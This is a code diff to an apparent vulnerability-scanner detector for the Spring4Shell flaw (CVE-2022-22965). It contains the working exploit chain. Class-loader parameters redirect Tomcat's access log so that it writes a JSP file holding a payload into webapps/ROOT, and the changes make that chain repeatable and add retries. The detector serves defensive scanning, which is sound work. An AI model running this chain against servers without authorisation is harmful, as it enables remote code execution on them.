@@ -78,13 +78,17 @@ public final class SpringCve202222965Detector implements VulnDetector {
   // A payload to append to the JSP file that will allow to delete the file itself
   private static final String JSP_CONTENT_TEMPLATE =
           "<%@ page import=\"java.io.File\" %>\n{{PAYLOAD}}\n<% if(\"1\".equals(request.getParameter(\"delete\"))){ File thisFile=new File(application.getRealPath(request.getServletPath())); thisFile.delete(); out.println(\"Deleted\"); } %>//";
-  private static final String JSP_FILENAME = "Tsunami" + System.currentTimeMillis();
+
+  // It's important that fileDateFormat is never the same to be able to trigger the exploit more than once.
+  private static final String JSP_FILENAME_SUFFIX = String.valueOf(System.currentTimeMillis());
+  private static final String JSP_FILENAME_PREFIX = "Tsunami_";
+  private static final String JSP_FILENAME = JSP_FILENAME_PREFIX + JSP_FILENAME_SUFFIX;
 
   private static final Map<String, String> LOG_CONFIG_PARAMS = ImmutableMap.of(
           "class.module.classLoader.resources.context.parent.pipeline.first.suffix", ".jsp",
           "class.module.classLoader.resources.context.parent.pipeline.first.directory", "webapps/ROOT",
-          "class.module.classLoader.resources.context.parent.pipeline.first.prefix", JSP_FILENAME,
-          "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat", ""
+          "class.module.classLoader.resources.context.parent.pipeline.first.prefix", JSP_FILENAME_PREFIX,
+          "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat", JSP_FILENAME_SUFFIX
   );
   private static final String LOG_FILE_DATE_FORMAT_QS = "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=_";
   private static final String LOG_PATTERN_PARAM = "class.module.classLoader.resources.context.parent.pipeline.first.pattern";
@@ -237,19 +241,6 @@ public final class SpringCve202222965Detector implements VulnDetector {
     HttpHeaders httpHeaders = HttpHeaders.builder().addHeader("Connection", "close").build();
 
     try {
-      // Setting and unsetting the fileDateFormat field allows for executing the exploit multiple times
-      // If re-running the exploit, this will create an artifact of {old_file_name}_.jsp
-      // Running this in case there already was an exploit attempt on this instance
-      Uninterruptibles.sleepUninterruptibly(Duration.ofSeconds(3));
-      httpClient.send(
-              HttpRequest.builder()
-                      .setMethod(httpMethod)
-                      .setUrl(targetUri + "?" + LOG_FILE_DATE_FORMAT_QS)
-                      .setHeaders(httpHeaders)
-                      .build(),
-              networkService
-      );
-
       // Generate JSP content
       logger.atInfo().log("Setting log configuration to write JSP file.");
       String jspContent = JSP_CONTENT_TEMPLATE
@@ -304,8 +295,6 @@ public final class SpringCve202222965Detector implements VulnDetector {
               networkService
       );
 
-      Uninterruptibles.sleepUninterruptibly(Duration.ofSeconds(3));
-
     } catch (IOException e) {
       return false;
     }
@@ -329,17 +318,28 @@ public final class SpringCve202222965Detector implements VulnDetector {
     HttpHeaders httpHeaders = HttpHeaders.builder().addHeader("Connection", "close").build();
     for (String url : urlsToCheck) {
       try {
-        HttpResponse response = httpClient.send(
-                get(url)
-                        .setHeaders(httpHeaders)
-                        .build(),
-                networkService
+        HttpResponse response;
+        int max_attempts = 5;
+        int attempt = 0;
+        boolean executed;
+        // If we get a 200, retry the request a few times as sometimes the contents haven't been written yet
+        do {
+          Uninterruptibles.sleepUninterruptibly(Duration.ofSeconds(3));
+          response = httpClient.send(
+                  get(url)
+                          .setHeaders(httpHeaders)
+                          .build(),
+                  networkService
+          );
+          executed = payload.checkIfExecuted(response.bodyString().orElse(""));
+        } while (
+                response.status() == HttpStatus.OK
+                        && !executed
+                        && attempt++ < max_attempts
         );
 
-        if (
-                response.status() == HttpStatus.OK
-                && payload.checkIfExecuted(response.bodyString().orElse(""))
-        ) {
+
+        if (executed) {
           logger.atInfo().log("Vulnerability confirmed via JSP file uploaded at %s", url);
 
           // Cleanup
